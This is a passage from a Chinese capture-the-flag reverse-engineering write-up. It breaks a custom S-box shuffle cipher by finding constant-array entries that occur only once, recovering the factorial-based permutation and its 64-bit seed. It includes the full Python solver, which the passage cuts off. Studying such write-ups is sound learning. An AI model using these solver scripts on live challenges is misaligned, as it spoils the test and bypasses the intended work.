0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001C, 0x00000031, 0x0000003D, 0x00000040, 0x00000097, 0x0000009D, 0x0000009E, 0x000000A1, 0x000000C7, 0x000000CD, 0x000000E2, 0x000000F8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000A, 0x00000020, 0x00000025, 0x00000035, 0x00000044, 0x00000055, 0x00000072, 0x000000CB, 0x000000DA, 0x000000DD, 0x000000ED, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000044, 0x00000052, 0x00000085, 0x00000093, 0x000000B4, 0x000000CB, 0x000000E3, 0x000000F0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000052, 0x00000059, 0x000000A2, 0x000000BE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002D, 0x00000055, 0x0000005B, 0x00000084, 0x000000C4, 0x000000D6, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x00000037, 0x00000041, 0x00000051, 0x00000053, 0x00000075, 0x00000076, 0x000000EA, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000F, 0x00000040, 0x0000006B, 0x0000009C, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000005, 0x00000011, 0x00000014, 0x00000017, 0x00000021, 0x00000058, 0x00000061, 0x0000006A, 0x00000083, 0x000000D6, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000022, 0x00000026, 0x00000090, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000006B, 0x0000006C, 0x00000086, 0x0000008C, 0x00000093, 0x000000F7, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000010, 0x00000013, 0x0000007C, 0x000000C0, 0x000000CB, 0x000000F3, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000027, 0x0000007C, 0x0000007F, 0x00000083, 0x00000086, 0x000000D9, 0x000000DB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000030, 0x00000032, 0x0000006D, 0x00000081, 0x000000BF, 0x000000ED, 0x000000FA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000022, 0x00000030, 0x00000032, 0x00000036, 0x0000005C, 0x000000D3, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000004, 0x00000009, 0x00000014, 0x00000080, 0x0000008E, 0x00000098, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001F, 0x00000064, 0x000000B6, 0x000000C4, 0x000000DD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000042, 0x00000056, 0x0000008E, 0x000000AF, 0x000000DD, 0x000000EF, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000032, 0x00000045, 0x0000004E, 0x0000006D, 0x00000075, 0x0000008F, 0x000000C8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000018, 0x0000005A, 0x0000005F, 0x0000006B, 0x00000096, 0x000000DB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000C, 0x0000006A, 0x000000CF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x0000003F, 0x00000065, 0x000000C2, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000004F, 0x00000050, 0x00000063, 0x000000C3, 0x000000CB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000000, 0x0000009B, 0x000000BC, 0x000000EE, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000004, 0x00000023, 0x0000003E, 0x00000042, 0x00000078, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000033, 0x00000036, 0x00000046, 0x0000007A, 0x00000083, 0x000000B2, 0x000000BE, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000006E, 0x000000A5, 0x000000A6, 0x000000A7, 0x000000A9, 0x000000B7, 0x000000D2, 0x000000E5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000017, 0x0000004F, 0x00000050, 0x00000062, 0x0000007E, 0x00000091, 0x00000097, 0x000000B1, 0x000000E4, 0x000000E9, 0x000000EC, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000051, 0x00000057, 0x0000005E, 0x000000B3, 0x000000DC, 0x000000F1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x0000000C, 0x0000004B, 0x0000005A, 0x0000008D, 0x00000095, 0x000000B8, 0x000000DB, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000019, 0x0000008B, 0x000000D8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001A, 0x0000006A, 0x0000007B, 0x000000B0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000005E, 0x0000006B, 0x000000AB, 0x000000AF, 0x000000F5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001B, 0x00000058, 0x0000008C, 0x00000096, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000050, 0x000000B5, 0x000000E5, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000001, 0x00000007, 0x00000052, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001D, 0x0000006D, 0x0000006F, 0x0000007C, 0x0000009F, 0x000000B7, 0x000000BE, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000027, 0x0000002B, 0x00000075, 0x00000089, 0x000000A3, 0x000000D0, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002E, 0x000000CD, 0x000000F4, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000C, 0x00000012, 0x00000042, 0x00000070, 0x00000075, 0x00000079, 0x00000097, 0x00000099, 0x000000BF, 0x000000CE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x0000007D, 0x00000088, 0x000000A3, 0x000000B8, 0x000000C9, 0x000000F1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001A, 0x0000001E, 0x00000052, 0x00000086, 0x000000AE, 0x000000D7, 0x000000E9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000D, 0x000000AD, 0x000000AF, 0x000000C0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x0000004D, 0x0000006C, 0x00000074, 0x00000076, 0x0000007A, 0x000000A9, 0x000000AE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000000, 0x0000000C, 0x00000017, 0x0000001E, 0x00000024, 0x00000027, 0x00000064, 0x00000067, 0x000000CC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x0000003D, 0x00000084, 0x00000085, 0x000000CD, 0x000000EB, 0x000000F8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000057, 0x00000084, 0x0000008A, 0x000000B6, 0x000000CD, 0x000000E9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x00000021, 0x0000002E, 0x0000003B, 0x00000073, 0x00000074, 0x000000A0, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000021, 0x00000033, 0x00000037, 0x00000067, 0x00000072, 0x000000A1, 0x000000CA, 0x000000E1, 0x000000FB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000023, 0x00000038, 0x00000047, 0x00000048, 0x0000004B, 0x0000004C, 0x00000057, 0x00000059, 0x00000069, 0x00000090, 0x000000A0, 0x000000BA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000031, 0x00000035, 0x0000003C, 0x00000093, 0x000000A1, 0x000000DE, 0x000000EE, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000066, 0x0000008C, 0x00000091, 0x00000094, 0x000000A0, 0x000000B0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000040, 0x0000007A, 0x00000096, 0x000000A4, 0x000000E0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000030, 0x0000003D, 0x0000005A, 0x0000006C, 0x00000080, 0x000000E6, 0x000000ED, 0x000000F2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000004, 0x00000019, 0x00000082, 0x00000088, 0x00000090, 0x00000094, 0x000000AC, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000022, 0x00000028, 0x0000003C, 0x0000006E, 0x00000079, 0x0000007E, 0x0000008E, 0x00000091, 0x00000099, 0x0000009D, 0x000000A0, 0x000000CC, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x00000033, 0x00000082, 0x0000008C, 0x00000090, 0x000000AA, 0x000000BC, 0x000000F8, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000017, 0x00000049, 0x00000093, 0x000000C7, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000019, 0x00000047, 0x0000005B, 0x00000060, 0x00000065, 0x000000BD, 0x000000F2, 0x000000F5, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000020, 0x0000002B, 0x00000031, 0x00000047, 0x00000048, 0x00000051, 0x00000054, 0x00000064, 0x00000078, 0x000000A1, 0x000000A5, 0x000000B4, 0x000000C8, 0x000000EE, 0x000000FE, 0x00000005, 0x00000011, 0x0000004A, 0x0000005D, 0x00000076, 0x00000077, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x0000006D, 0x0000009A, 0x000000A3, 0x000000CE, 0x000000DC, 0x000000E0, 0x000000E4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x0000001D, 0x0000003A, 0x00000046, 0x00000098, 0x0000009C, 0x000000E7, 0x000000F3, 0x000000F5, 0x000000F8, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001E, 0x00000034, 0x0000003B, 0x00000046, 0x00000079, 0x000000A7, 0x000000B0, 0x000000C4, 0x000000E0, 0x000000E7, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000070, 0x00000087, 0x00000097, 0x0000009E, 0x000000A6, 0x000000FB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001C, 0x00000021, 0x0000002B, 0x00000039, 0x0000004A, 0x0000006C, 0x00000081, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000006, 0x00000041, 0x00000064, 0x0000007F, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000020, 0x00000022, 0x0000005C, 0x000000B0, 0x000000B6, 0x000000B9, 0x000000C2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000014, 0x0000001E, 0x00000079, 0x00000092, 0x00000096, 0x000000BC, 0x000000C7, 0x000000DA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000016, 0x00000046, 0x0000007D, 0x00000089, 0x000000D5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000043, 0x0000004C, 0x0000006A, 0x0000007D, 0x0000007F, 0x0000008D, 0x000000C2, 0x000000F2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000029, 0x00000045, 0x00000051, 0x00000069, 0x00000091, 0x000000B6, 0x000000EA, 0x000000F5, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000011, 0x00000036, 0x00000038, 0x00000040, 0x0000005C, 0x00000099, 0x000000D1, 0x000000E9, 0x000000EE, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000004B, 0x00000058, 0x00000071, 0x00000084, 0x000000C6, 0x000000F3, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF]arr = np.zeros((4, 21, 15))for m in range(4): for n in range(21): for p in range(15): arr[m][n][p] = _arr[(21 * m + n) * 15 + p]arr = np.array(_arr).reshape((4, 21, 15))round = 0S = list(range(256))flag = [0x3132333435360a00, 0, 0, 0]# 向程序输入 123456, 动调 dump 出的 flag 的值for round in range(4): order = list(range(21)) n = 20 bignum = math.factorial(n) # 20 的阶乘，即 0x21C3677C82B40000 index = 0 while n: quot = index + flag[round] // bignum flag[round] %= bignum order[quot], order[index] = order[index], order[quot] bignum //= n index += 1 n -= 1 for i in range(21): for j in range(15): if arr[round][order[i]][j] != 0xFFFFFFFF: S[int(arr[round][order[i]][j])] += iwith open('../cipher-release', 'rb') as f: src = f.read() src = list(src)with open('output', 'rb') as f:#以 123456 作为输入得到的 output 文件 final = f.read() final = list(final)for i in range(256): assert (S[i] &amp; 0xff == final[src.index(i)])乍一看似乎没有可逆的点，这 shuffle 数据混洗的这么严重要怎么逆向？ 但是想想面对难以逆向的算法，那么这个算法必定在密码学上是有漏洞存在的，否则真就没人做得出来了 这里需要注意 arr 这个超大的常数数组，这个数组的唯一会改变 S 盒的值的变量，但是当 arr 的值等于 0xFFFFFFFF 时，是不会对 S盒 中数据的值做出更改的，并且我们看一下赋值语句 S[int(arr[round][order[i]][j])] += i , arr 的值会让 S 盒对应位置上的值 +i 如果 S 盒上同一位置的值连续加两次，那么我们肯定是不知道这两次分别加了哪两个数 但是，要是 S 盒上同一位置的值只加一次呢？最终的值和开始的值减一减，不就知道 +i 加的数什么了吗 我们写个小脚本看看 arr 中有多少数字只出现过一次 _arr=[...]# 数组太大我就省略啦，值和上面的是一样的dict = &#123;&#125;for key in _arr: if key==0xffffffff: key = \"0x-1\" else: key = \"0x\"+hex(key)[2::].zfill(2) dict[key] = dict.get(key, 0) + 1print(dict)输出为 &#123;'0x2a': 2, '0x5b': 4, '0x7e': 3, '0xc1': 1, '0xdc': 3, '0x-1': 663, '0x2c': 1, '0x59': 4, '0x6f': 2, '0x78': 4, '0x8e': 4, '0xbd': 2, '0x01': 2, '0x04': 4, '0x0e': 1, '0x88': 3, '0x8b': 2, '0xb4': 3, '0x38': 3, '0xa6': 3, '0xae': 4, '0xc3': 2, '0xe3': 3, '0xe8': 1, '0xff': 4, '0x13': 4, '0x16': 3, '0x58': 4, '0x5d': 2, '0xbb': 1, '0x89': 3, '0x9d': 3, '0xb7': 3, '0xc5': 1, '0xc6': 2, '0xf9': 3, '0x02': 4, '0x20': 4, '0x47': 4, '0x8f': 2, '0x98': 3, '0xcc': 3, '0xdf': 1, '0x15': 4, '0x70': 3, '0xa8': 1, '0x62': 2, '0x68': 1, '0xc2': 4, '0xea': 3, '0x0a': 2, '0x0d': 2, '0x2f': 1, '0x44': 3, '0x57': 4, '0x7f': 4, '0xdb': 4, '0x0b': 1, '0x18': 2, '0x86': 4, '0xdd': 4, '0x1c': 2, '0x31': 3, '0x3d': 3, '0x40': 4, '0x97': 4, '0x9e': 2, '0xa1': 4, '0xc7': 3, '0xcd': 4, '0xe2': 1, '0xf8': 4, '0x25': 1, '0x35': 2, '0x55': 2, '0x72': 2, '0xcb': 4, '0xda': 2, '0xed': 3, '0x52': 4, '0x85': 2, '0x93': 4, '0xf0': 1, '0xa2': 1, '0xbe': 3, '0x2d': 1, '0x84': 4, '0xc4': 3, '0xd6': 2, '0xe1': 4, '0x37': 2, '0x41': 2, '0x51': 4, '0x53': 1, '0x75': 4, '0x76': 3, '0xef': 4, '0x0f': 1, '0x6b': 4, '0x9c': 2, '0x05': 2, '0x11': 3, '0x14': 3, '0x17': 4, '0x21': 4, '0x61': 1, '0x6a': 4, '0x83': 3, '0x22': 4, '0x26': 1, '0x90': 4, '0xec': 4, '0x6c': 4, '0x8c': 4, '0xf7': 1, '0x10': 1, '0x7c': 3, '0xc0': 2, '0xf3': 3, '0xf6': 3, '0x27': 3, '0xd9': 1, '0x30': 3, '0x32': 3, '0x6d': 4, '0x81': 2, '0xbf': 2, '0xfa': 1, '0x36': 3, '0x5c': 3, '0xd3': 1, '0x03': 4, '0x09': 1, '0x80': 2, '0xfc': 3, '0x1f': 1, '0x64': 4, '0xb6': 4, '0x42': 3, '0x56': 1, '0xaf': 3, '0xfd': 4, '0x45': 2, '0x4e': 1, '0xc8': 2, '0x5a': 3, '0x5f': 1, '0x96': 4, '0x0c': 4, '0xcf': 1, '0x3f': 1, '0x65': 2, '0x4f': 2, '0x50': 3, '0x63': 1, '0x00': 2, '0x9b': 1, '0xbc': 3, '0xee': 4, '0x23': 2, '0x3e': 1, '0xd4': 3, '0x33': 3, '0x46': 4, '0x7a': 3, '0xb2': 1, '0x6e': 2, '0xa5': 2, '0xa7': 2, '0xa9': 2, '0xd2': 1, '0xe5': 2, '0x91': 4, '0xb1': 1, '0xe4': 2, '0xe9': 4, '0x5e': 2, '0xb3': 1, '0xf1': 2, '0x4b': 3, '0x8d': 2, '0x95': 1, '0xb8': 2, '0x19': 3, '0xd8': 1, '0x1a': 2, '0x7b': 1, '0xb0': 4, '0xab': 1, '0xf5': 4, '0x1b': 1, '0xb5': 1, '0x07': 1, '0x1d': 2, '0x9f': 1, '0x2b': 3, '0xa3': 3, '0xd0': 1, '0x2e': 2, '0xf4': 1, '0xfe': 4, '0x12': 1, '0x79': 4, '0x99': 3, '0xce': 2, '0x7d': 3, '0xc9': 1, '0x1e': 4, '0xd7': 1, '0xad': 1, '0x08': 3, '0x4d': 1, '0x74': 2, '0x24': 1, '0x67': 2, '0xeb': 1, '0x8a': 1, '0x3b': 2, '0x73': 1, '0xa0': 4, '0xca': 1, '0xfb': 2, '0x48': 2, '0x4c': 2, '0x69': 2, '0xba': 1, '0x3c': 2, '0xde': 1, '0x66': 1, '0x94': 2, '0xa4': 1, '0xe0': 3, '0xe6': 1, '0xf2': 3, '0x82': 2, '0xac': 1, '0x28': 1, '0xaa': 1, '0x49': 1, '0x60': 1, '0x54': 1, '0x4a': 2, '0x77': 1, '0x9a': 1, '0x3a': 1, '0xe7': 2, '0x34': 1, '0x87': 1, '0x39': 1, '0x06': 1, '0xb9': 1, '0x92': 1, '0xd5': 1, '0x43': 1, '0x29': 1, '0xd1': 1, '0x71': 1&#125;知道了加的数是什么有什么用？这作用可大了！ 通过知道加了什么数，在辅以 S 盒的对应位置信息，就可以计算出经过 shuffle 操作之后的 order 序列顺序 arr = np.array(_arr).reshape((4, 21, 15))S = list(range(256))with open('./cipher-release', 'rb') as f: src = f.read() src = list(src)with open('output', 'rb') as f: final = f.read() final = list(final)key = [[-1 for order in range(21)] for round in range(4)]for i in range(256): S[i] = final[src.index(i)] if len(np.argwhere(arr == i)) == 1: round, order_i, j = list(np.argwhere(arr == i)[0]) key[round][S[i] - i] = order_i随后通过 order 序列，就可以逆向推出最开始输入的长为 64 位的数值究竟是多少，由此便可以推出 flag 来啦～ for round in range(4): order = key[round] seed = 0 pre_order = list(range(21)) for i in range(21): j = pre_order.index(order[i]) pre_order[i], pre_order[j] = pre_order[j], pre_order[i] seed += math.factorial(20 - i) * (j - i)于是 exp 如下，做完这题虽然备受折磨，但着实有中柳暗花明又一村的感觉 import mathimport numpy as np_arr = [0x0000002A, 0x0000005B, 0x0000007E, 0x000000C1, 0x000000DC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002A, 0x0000002C, 0x00000059, 0x0000006F, 0x00000078, 0x0000008E, 0x000000BD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000001, 0x00000004, 0x0000000E, 0x00000088, 0x0000008B, 0x000000B4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000038, 0x000000A6, 0x000000AE, 0x000000C3, 0x000000E3, 0x000000E8, 0x000000FF, 0xFFFFFFFF, 